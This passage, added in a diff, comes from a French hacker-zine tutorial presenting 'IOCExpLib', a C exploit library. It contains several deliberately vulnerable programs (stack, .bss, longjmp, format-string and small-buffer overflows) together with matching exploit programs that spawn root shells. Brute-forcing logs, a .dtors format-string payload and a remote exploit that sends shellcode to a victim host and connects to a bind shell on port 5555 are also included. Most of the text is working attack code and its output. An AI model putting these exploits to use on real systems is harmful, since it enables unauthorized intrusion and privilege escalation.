+   if (argc > 2) offset = atoi(argv[2]);
+   
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 512);
+   IOCExpLib_sb_build(bsize, offset, align, RET, 0, shellcode);
+   IOCExpLib_split(CMD);
+   IOCExpLib_exec_vuln();
+
+   return 0;
+}
+
+----------------------------------
+
+   On utilise dans ce cas là une adresse de retour 0xbffff5a8, ainsi que le
+shellcode dont l'identifiant est 2, ce shellcode lance /bin/sh et ne fait que 
+24 octets! =)
+
+gcc -o vuln1 vuln1.c
+gcc -o exp_sb_nobf exp_sb_nobf.c
+./exp_sb_nobf 1500
+[+] Using adress: 0xbffff5a8
+sh-2.04# exit
+exit
+
+   Essayons désormais de bruteforcer la taille du buffer, l'offset et 
+l'alignement 
+en mémoire.
+
+------exp_sb_bruteforcer.c--------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "vuln <breakme>\n"
+
+int
+main(int argc,char *argv[]) {
+
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE, align=0;
+  int res;
+  char shellcode[512];
+
+   if (argc > 1) bsize  = atoi(argv[1]);
+   if (argc > 2) offset = atoi(argv[2]);
+
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 512);
+   res = IOCExpLib_sb_bruteforce(bsize, offset, 0, CMD, shellcode);
+
+   return 0;
+}
+
+----------------------------------
+
+   Notons qu'on entre la valeur 0 comme troisième argument, qui correspond norm-
+-alement à l'adresse de retour que nous désirons utiliser pour la fonction
+IOCExpLib_sb_bruteforce();; ce qui a pour résultat de laisser l'exploit tenter 
+de calculer lui même une adresse de retour valide.
+
+gcc -o exp_sb_bruteforce exp_sb_bruteforce.c
+./exp_sb_bruteforce 2100
+[x] Starting bruteforcing offset/align/buffer size
+[+] Using buffer size = 2100 ; offset = 0; align = 0
+[+] Using address: 0xbffff548
+[+] Using buffer size = 2100 ; offset = 0; align = 1
+[+] Using address: 0xbffff548
+[+] Using buffer size = 2100 ; offset = 0; align = 2
+[+] Using address: 0xbffff548
+[+] Using buffer size = 2100 ; offset = 0; align = 3
+[+] Using address: 0xbffff548
+[+] Using buffer size = 2100 ; offset = -100; align = 0
+[+] Using address: 0xbffff5ac
+[+] Using buffer size = 2100 ; offset = -100; align = 1
+[+] Using address: 0xbffff5ac
+[+] Using buffer size = 2100 ; offset = -100; align = 2
+[+] Using address: 0xbffff5ac
+[+] Using buffer size = 2100 ; offset = -100; align = 3
+[+] Using address: 0xbffff5ac
+[+] Using buffer size = 2100 ; offset = -200; align = 0
+[+] Using address: 0xbffff610
+[+] Using buffer size = 2100 ; offset = -200; align = 1
+[+] Using address: 0xbffff610
+[+] Using buffer size = 2100 ; offset = -200; align = 2
+[+] Using address: 0xbffff610
+[+] Using buffer size = 2100 ; offset = -200; align = 3
+
+[.....]
+
+[+] Using address: 0xbffff8cc
+[+] Using buffer size = 2100 ; offset = -1000; align = 0
+[+] Using address: 0xbffff930
+[+] Using buffer size = 2100 ; offset = -1000; align = 1
+[+] Using address: 0xbffff930
+[+] Using buffer size = 2100 ; offset = -1000; align = 2
+[+] Using address: 0xbffff930
+[+] Using buffer size = 2100 ; offset = -1000; align = 3
+[+] Using address: 0xbffff930
+[+] Using buffer size = 2000 ; offset = 0; align = 0
+[+] Using address: 0xbffff548
+sh-2.04# exit
+exit
+[+] Exited: shell's ret code = 0
+[+] Buffer size found: 2000; offset found: 0; align found = 0, if no shell ran 
+then try again with higher default values
+Bsize found = 2000; offset found = 0; align found = 0
+
+
+   Voici la sortie d'un bruteforcing réussi en mode verbose, j'ai volontairement
+choisi une taille de buffer assez grande à partir de laquelle bruteforcer, pour
+pouvoir observer le comportement de la fonction qui bruteforce. Comme vous 
+pouvez le voir, pour une taille x que l'on diminue de 100 à chaque itération, 
+on utilise un offset y que l'on décrémente de 0 à  -1000 et pour cet offset y 
+on utilise un alignement z incrémenté, lui, de 0 à 3.
+
+
+
+ 2) Heap-based overflows
+
+    2.1) Écrasement de pointeurs de fonctions
+
+   Passons aux buffer overflows ayant lieu dans le heap.
+   Voici le programme vulnérable, issu de l'article de OUAH intitulé "advanced
+buffer overflow" (voir références):
+
+----------vulnbss.c---------------
+
+ #include <stdio.h>
+ #include <string.h>
+
+ void foo()
+ {
+ printf("La fonction foo a été exécutée\n");
+ }
+
+ main (int argc, char *argv[])
+ {
+ static char buf[64];
+ static void(*funcptr)();
+
+ funcptr=(void (*)())foo;
+
+ if (argc < 2) exit(-1);
+
+ strcpy(buf, argv[1]); // here's the flaw
+ (void)(*funcptr)();
+
+ }
+
+----------------------------------
+
+
+Voici le programme exploitant la faille sans bruteforcer:
+
+
+---------exp_hb_nobf.c------------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "vulnbss <breakme>\n"
+
+int
+main(int argc,char *argv[]) {
+
+
+  char *shellcode;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int res;
+  unsigned long ret;
+
+   if (argc > 1) bsize  = atoi(argv[1]);
+   if (argc > 2) offset = atoi(argv[2]);
+  
+   shellcode = (char *)malloc(1024);
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 1024);
+ 
+   ret = IOCExpLib_get_section("vulnbss", "bss");
+   IOCExpLib_hb_build(bsize, offset, ret, shellcode, 0);
+   IOCExpLib_split(CMD);
+   IOCExpLib_exec_vuln();
+    return 0;
+}
+
+----------------------------------
+
+
+gcc -o vulnbss vulnbss.c
+gcc -o exp_hb_nobf exp_hb_nobf.c
+/exp_hb_nobf 64 64
+[+] .bss address is : 80496e0   
+[+] Using ret address: 0x8049720
+sh-2.04# exit
+exit
+ 
+   Voici un exemple de programme bruteforçant l'offset:
+
+
+
+-------exp_hb_bruteforce.c--------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "vulnbss <breakme>\n"
+
+int
+main(int argc,char *argv[]) {
+
+
+  char *shellcode;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int res;
+  unsigned long ret;
+
+   if (argc > 1) bsize  = atoi(argv[1]);
+   if (argc > 2) offset = atoi(argv[2]);
+  
+   shellcode = (char *)malloc(1024);
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 1024);
+
+   ret = IOCExpLib_get_section("vulnbss", "bss");
+   IOCExpLib_hb_bruteforce(bsize, offset, ret, CMD, shellcode, 0);
+    return 0;
+}
+
+
+----------------------------------
+
+gcc -o exp_hb_bruteforce exp_hb_bruteforce.c
+./exp_hb_bruteforce 64 500
+[+] Using offset: 500
+[+] Using ret address: 0x80498d4
+[+] Using offset: 490
+[+] Using ret address: 0x80498ca
+[+] Using offset: 480
+[+] Using ret address: 0x80498c0
+[+] Using offset: 470
+[+] Using ret address: 0x80498b6
+
+[...]
+
+[+] Using offset: 120
+[+] Using ret address: 0x8049758
+[+] Using offset: 110
+[+] Using ret address: 0x804974e
+[+] Using offset: 100
+[+] Using ret address: 0x8049744
+[+] Using offset: 90
+[+] Using ret address: 0x804973a
+[+] Using offset: 80
+[+] Using ret address: 0x8049730
+[+] Using offset: 70
+[+] Using ret address: 0x8049726
+sh-2.04# exit
+exit
+[+] Exited: shell's ret code = 0
+[+] Offset found: 70, a working return address could be: 0x8049726
+
+
+
+    2.2) Écrasement du champs __pc de la structure jmbuf
+
+
+   Voici un exemple un petit peu plus avancé qui reste dans le cadre des heap-
+based overflows, à la différence qu'ici nous n'écraserons pas un pointeur de 
+fonction mais le champs jmpbuf -> __pc (program counter), jmbuf étant une struc-
+-ture utilisée par la fonction longjmp() (qui permet de faire des branchements 
+non-locaux dans des programmes). Ce champ contient l'adresse du registre eip,
+le pointeur d'instruction, et se situe à jmpbuf + 20, voici le programme 
+vulnérable encore issu du fabuleux article de OUAH:
+
+
+--------lonjmp.c------------------
+
+
+ #include <string.h>
+ #include <setjmp.h>
+
+ static char buf[64];
+ jmp_buf jmpbuf;
+
+ main(int argc, char **argv)
+ {
+
+ if (argc <= 1) exit(-1);
+
+ if (setjmp(jmpbuf)) exit(-1);
+
+ strcpy(buf, argv[1]); // here's the flaw
+
+ longjmp(jmpbuf, 1);
+ }
+
+----------------------------------
+
+
+   Et voici l'exploit, comme à l'habitude la librairie s'occupe de construire
+notre payload:
+
+
+---------exp_hb_ljnobf.-----------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "longjmp <breakme>\n"
+
+int
+main(int argc,char *argv[]) {
+
+
+  char *shellcode;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int res;
+  unsigned long ret;
+
+   if (argc > 1) bsize  = atoi(argv[1]);
+   if (argc > 2) offset = atoi(argv[2]);
+  
+   shellcode = (char *)malloc(1024);
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 1024);
+
+   ret = IOCExpLib_get_section("longjmp", ".bss");
+   IOCExpLib_hb_build(bsize, offset, ret, shellcode, 1);
+   IOCExpLib_split(CMD);
+   IOCExpLib_exec_vuln();
+  
+    return 0;
+}
+
+----------------------------------
+
+gcc -o longjmp longjmp.c
+gcc -o exp_hb_ljnobf exp_hb_ljnobf.c
+./exp_hb_ljnobf 64 50
+[+] ..bss address is : 80496b8
+[+] Using ret address: 0x80496ea
+sh-2.04# exit
+exit
+
+
+
+ 3) Format bugs exploitation
+
+   Voici un petit programme présentant une faille du type format bug:
+
+
+----------vul.c-------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+void vulnerable(char *arg)
+{
+   char buffer[1024];
+   char string[64];
+
+   strcpy (string, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+   snprintf (buffer, sizeof(buffer), arg);
+
+   printf ("%s\n", buffer); // here's the flaw
+   //sleep(0.1);
+   return;
+}
+
+
+int main(int argc, char **argv)
+{
+   if (argc > 1)
+      vulnerable(argv[1]);
+
+   return (0);
+}
+
+----------------------------------
+
+
+   L'exploit qui suit codé avec notre petite librairie, permet une exploitation
+simple et rapide. La technique employée ci-dessous évite d'employer toute une
+quirielle de NOP, par l'obtention de l'adresse exacte du shellcode en mémoire.
+Comment? Le principe du small-buffer overflow, on stocke le shellcode en mémoire
+dans le tableau de char *argv|]. En effet, le programme s'appelle lui même une 
+fois de manière à obtenir une adresse "statique" pour arg et argv et ainsi 
+l'utiliser comme adresse de retour pour notre shellcode à injecter dans la 
+plage mémoire du programme vulnérable. (arg et argv on la propriété de ne plus 
+évoluer au bout du deuxième appel récursif d'un programme).
+   Cet exploit écrase le tag head de la section .dtors par l'adresse exacte de
+notre shellcode, ainsi à la fin du programme, notre shellcode sera éxécuté.
+   Notez que l'on aurait pu aussi écraser l'adresse d'une fonction de la Global
+Offset Table, (d'ou l'utilité du sleep(0.1) après le printf() dans le code vuln-
+-érable).
+
+
+-----------exp.c------------------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+char progname[128] = "./vul"; /* 128 octets = 75 eats maximum */
+
+int
+main(int argc, char **argv) {
+  
+  int offset;
+  unsigned long addr;
+  char *buf;
+  char shellcode[512];
+
+  addr = IOCExpLib_get_dtors(progname);
+  offset = IOCExpLib_get_offset(progname);
+
+  strncpy(shellcode, IOCExpLib_return_shellcode(2), 512);
+  if (argc == 1) {
+    
+    fprintf(stderr, "Calling %s ...\n", argv[0]);
+
+    buf = IOCExpLib_fs_build(addr, &shellcode, offset);          
+    
+    fprintf(stderr, "[%s] (%d)\n", buf, strlen(buf));
+
+    execlp(argv[0], argv[0], buf, &shellcode, argv[1], argv[2], NULL);
+
+  } else {
+
+    fprintf(stderr, "Calling %s ...\n", progname);
+    fprintf(stderr, "sc = %p\n", argv[2]);
+    buf = IOCExpLib_fs_build(addr, argv[2], offset);       
+    
+    fprintf(stderr, "[%s] (%d)\n", buf, strlen(buf));
+
+    /* have fun baby! */
+    execlp(progname, progname, buf, argv[2], argv[3], argv[4], NULL);
+  }
+  
+  return 0;
+}
+
+
+----------------------------------
+
+gcc -o vul vul.c
+gcc -o exp exp.c
+./exp
+[+].DTORS address is : 8049638
+[+] starting to try to find the offset...
+[+] trying... ././vul BBBB%x
+[+] trying... ././vul BBBB%x%x
+[+] trying... ././vul BBBB%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] nombre de eats : 18
+Calling ./exp ...
+[+] adr : 134518328 (8049638)
+[+] val : -1073744336 (bffff630)
+[+] valh: 49151 (bfff)
+[+] vall: 63024 (f630)
+[:8%.49143x%18$hn%.13873x%19$hn] (36)
+[+].DTORS address is : 8049638
+[+] starting to try to find the offset...
+[+] trying... ././vul BBBB%x
+[+] trying... ././vul BBBB%x%x
+[+] trying... ././vul BBBB%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] trying... ././vul BBBB%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+[+] nombre de eats : 18
+Calling ./vul ...
+sc = 0xbffffa19
+[+] adr : 134518328 (8049638)
+[+] val : -1073743335 (bffffa19)
+[+] valh: 49151 (bfff)
+[+] vall: 64025 (fa19)
+[:8%.49143x%18$hn%.14874x%19$hn] (36)
+:80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+sh-2.04# exit
+exit
+
+   Quand je vous disais que la sortie en mode bavard était conséquente !
+
+
+ 4) Small-buffers overflow
+
+   Voici le dernier cas de figure que nous étudierons, l'exploitation de buffers
+de trop petite taille pour pouvoir stocker un shellcode (i.e en local des 
+buffers dont la taille est inférieur à 25 octets). Comme déjà expliqué 
+précédemment, leur petite taille ne représente pas un problème potentiel 
+puisque nous stockerons
+le shellcode dans le dernier élement du tableau de char *argv[], puis nous récu-
+-pèrerons l'adresse du début du dernier argument de argv (souvenez vous que
+argv termine toujours à la même adresse mémoire, ainsi il nous suffit de 
+soustraire la taille de notre shellcode à l'adresse du dernier élément de argv 
+pour obtenir l'adresse exacte de notre shellcode en mémoire). 
+
+
+   Voici le programme vulnérable:
+
+
+----------vulnsb.c----------------
+
+int exploitme(char *arg)
+{
+  char buff[10];
+  strcpy(buff,arg); // here's the flaw
+  return (0);
+}
+
+int main(int argc, char **argv)
+{
+  if (argc < 2)
+    {
+      printf("Usage : %s string\n", argv[0]);
+      return (-1);
+    }
+  exploitme(argv[1]);
+  return (0);
+}
+
+----------------------------------
+
+
+   Et voici notre exploit codé avec la lib IOCExpLib.h.
+
+
+----------exp_smallb.c------------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "vulnsb <breakme>"
+
+extern char **environ;
+
+int
+main(int argc,char *argv[]) {
+
+  int bsize=DEFAULT_BUFFER_SIZE, align=2;
+  int res;
+  char shellcode[512];
+
+   if (argc > 1) bsize  = atoi(argv[1]);
+
+   strncpy(shellcode, IOCExpLib_return_shellcode(2), 512);
+   res = IOCExpLib_small_buffer(argc, argv, environ, bsize, align, shellcode);
+   IOCExpLib_split(CMD);
+   IOCExpLib_exec_vuln();
+   return 0;
+}
+
+----------------------------------
+
+gcc -o vulnsb vulnsb.c
+gcc -o exp_smallb exp_smallb.c
+./exp_smallb
+[+] Using ret address: 0xbffff9fb
+sh-2.04# exit
+exit
+
+   Rien de plus simple :)
+
+
+ 
+   J'aurais voulu ajouter plus d'exemples, mais le temps a joué contre moi, 
+trève de bonnes excuses, continuons.
+
+ 
+
+  5) Network exploitation
+
+   Je tiens à vous le dire tout de suite je n'ai encore pas eu le temps de 
+tester la librairie sur un vrai programme vulnérable, mais voici le squelette 
+de tout remote exploit qui se respecte. Notons qu'ici nous utiliserons une 
+faille classique de type buffer overflow, mais à distance.
+
+   Squelette de notre code:
+
+ déclarations des headers..
+ #include "IOCExpLib.h"
+ ....
+ int main(int argc, char *argv[])
+ {
+     construction de notre payload;
+     construction de notre socket réseau;
+     connection à l'hôte distant;
+     envoie de notre payload;
+     connection au port ouvert par notre shellcode;
+     envoie d'une comannde quelconque;
+     lancement de notre shell interactif;
+     return 0;
+ }
+
+   Le problème avec une exploitation distante de bug, c'est que nous devons 
+deviner une adresse de retour pour notre shellcode, et nous n'avons pas la 
+possibiliter de bruteforcer offset et alignement. (le serveur plante à chaque 
+envoie d'un payload avec adresse de retour invalide, en effet il segfault tout 
+simplement). Le mieux est de lancer le serveur vulnérable chez soi et de 
+rechercher l'adresse du milieu du buffer vulnérable par exemple (via gdb).
+
+
+   Voici un exemple de remote exploit avec notre lib:
+
+
+-----------remote_exp.c-----------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define RET 0xbffff5a8
+
+int
+main(int argc,char *argv[])
+{
+
+   int offset=0, bsize=128, align=0;
+   char *victim;
+   char shellcode[512];
+   int port, fd, res;
+ 
+   if (argc < 3)
+   {
+        fprintf(stderr, "%s host port\n", argv[0]);
+        exit(0);
+   }
+
+   victim = (char *)malloc(strlen(argv[1]) + 1);
+   victim  = argv[1];
+   port = atoi(argv[2]);
+   
+   strncpy(shellcode, IOCExpLib_return_shellcode(3), 512);
+   IOCExpLib_sb_build(bsize, offset, align, RET, 0, shellcode);
+
+   fd = IOCExpLib_connect(victim, port);
+   if (fd < 0) exit(0);
+
+   res = IOCExpLib_send(fd, IOCExpLib_payload);
+   if (res < 0) exit(0);
+
+   fd = IOCExpLib_connect(victim, 5555);
+   if (fd < 0){
+       fprintf(stderr, "Port 5555 appears not to be open, exploit failed\n");
+       exit(0);
+  }
+
+   res = IOCExpLib_send(fd, "id;uname -a");
+   if (res < 0) exit(0);
+
+   IOCExpLib_remote_shell(fd);
+   return 0;
+}
+
+----------------------------------
+
+
+
+  III - Conclusion
+  _________________
+
+
+ 1) Le mot de la fin...
+
+   Comme vous aurez pu le remarquer, cette librairie est loin d'être achevée, il
+reste encore énormément de pistes à explorer, d'exploitation de bugs à 
+implémenter. Il faudrait améliorer la souplesse générale de la librairie pour 
+pouvoir l'utiliser dans beaucoup plus de cas. Même si cette librairie est de 
+loin bien moins codé que la LibExp disponible sur packetfactory.net, elle 
+possède la vertue d'exploiter une plus large gamme de bugs. Il a été 
+extrémement difficile pour mon niveau de concilier souplesse et exhaustivité 
+comme je le disais précédemment, le code est assez vaste, et il est très facile 
+de perdre le contrôle de son code. Cette librairie, comme je le répète n'en est 
+qu'à sa version bétà, très prochainement beaucoup plus de shellcodes seront 
+implémenter. (voir le TOCOME à la fin de l'article). Si vous trouvez des bugs 
+de conception dans mon code, et il y doit y en avoir, conctatez moi, ça me fera 
+plaisir.
+
+
+
+ 2) Remerciements
+
+   Je tiens à remercier toutes les personnes citées ci-dessous pour leur aide,
+leurs conseils et leur soutien:
+
+   - ins tout d'abord pour ses conseils de qualité,
+   - Emper0r pour ses shellcodes,
+   - ackeur pour sa documentation
+   - Evanescence aka Cursed Lao pour son soutien.
+  
+  Je tiens aussi à remercier tous les auteurs des articles qui figurent dans les
+références ci-dessous, sans qui je n'aurais pu arriver jusque là.
+
+
+ 3) TOCOME
+
+   Parce qu'on en a jamais assez, to-come:
+   # Plus, beaucoup plus de shellcodes,
+   # malloc chunk corruption,
+   # RET-into-Libc exploitation,
+   # Reprogrammation totale de la fonction IOCExpLib_sb_build().
+
+
+
+
+
+ IV - Références
+ ________________
+
+   Tous ces articles sont d'une très grande facture:
+
+Exploitation avancée de buffer overflow par OUAH: (la référence française)
+http://ouah.kernsh.org/advbof.pdf
+
+Eviter les failles de sécurité dès le développement d'une application par 
+C.Blaess, C.GRENIER, F.RAYNAL:
+http://inferno.cs.univ-paris8.fr/~hacker/faillesart1.htm
+http://inferno.cs.univ-paris8.fr/~hacker/faillesart2.htm
+http://inferno.cs.univ-paris8.fr/~hacker/faillesart3.htm
+http://inferno.cs.univ-paris8.fr/~hacker/faillesart4.htm
+
+Nop Sux ... Buffer overflow & shellcode sans Nops par Seb-Sb:
+http://ouah.kernsh.org/bo2seb.txt
+
+w00w00 on Heap Overflow by Matt Conover & w00w00 Security Team
+http://www.w00w00.org/files/articles/heaptut.txt
+
+
+ Contactez-moi - Li0n7@voila.fr
+
+
+
+
